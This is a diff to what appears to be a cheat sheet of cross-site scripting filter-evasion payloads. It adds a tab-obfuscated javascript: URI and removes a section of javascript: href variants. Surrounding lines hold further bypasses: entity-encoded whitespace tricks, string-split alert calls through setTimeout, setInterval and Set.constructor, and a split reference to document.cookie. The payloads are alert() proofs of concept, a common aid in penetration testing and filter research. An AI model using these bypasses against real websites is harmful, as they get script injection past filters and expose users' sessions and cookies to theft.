@@ -37,6 +37,7 @@ window["doc"+"ument"]["cookie"]
 ```
 <!--javascript -->
 ja&Tab;vascript:alert(1)
+java\tscript:alert(1)
 ja&NewLine;vascript:alert(1)
 ja&#x0000A;vascript:alert(1)
 java&#x73;cript:alert()
@@ -108,17 +109,6 @@ setTimeout('ale'+'rt(2)');
 setInterval('ale'+'rt(10)');
 Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
-```
-## Href
-```
-javascript:alert(1)
-javascript:prompt(1)
-javascript://%0Aalert(1)
-javascript://anything%0D%0A%0D%0Awindow.alert(1)
-java\tscript:alert(1)
-java\rscript:alert(1)
-java\tscript:alert(1)
-javascript:ale'+'rt(12)
 ```
 
 ## Events
